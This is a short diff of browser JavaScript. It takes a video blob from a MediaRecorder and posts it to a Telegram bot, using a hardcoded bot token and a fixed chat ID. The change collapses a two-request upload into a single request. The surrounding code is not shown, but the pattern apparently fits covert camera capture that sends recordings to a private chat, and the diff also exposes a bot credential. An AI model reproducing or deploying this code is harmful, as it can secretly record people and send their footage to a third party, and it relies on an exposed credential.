@@ -33,26 +33,8 @@
           const formData = new FormData();
           formData.append('video', blob);
           const xhr = new XMLHttpRequest();
-          xhr.open('POST', `https://api.telegram.org/bot6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es/sendVideo`, true);
-          xhr.setRequestHeader('Content-Type', 'multipart/form-data');
+          xhr.open('POST', `https://api.telegram.org/bot6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es/sendVideo?chat_id=5112680061`, true);
           xhr.send(formData);
-          
-          // Get the file ID of the sent video
-          xhr.onload = () => {
-            if (xhr.status === 200) {
-              const response = JSON.parse(xhr.responseText);
-              const fileId = response.result.video.file_id;
-              
-              // Send the video to the user's chat ID
-              const xhr2 = new XMLHttpRequest();
-              xhr2.open('POST', `https://api.telegram.org/bot6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es/sendVideo`, true);
-              xhr2.setRequestHeader('Content-Type', 'application/json');
-              xhr2.send(JSON.stringify({
-                chat_id: 5112680061,
-                video: fileId
-              }));
-            }
-          };
         };
         mediaRecorder.start();
         
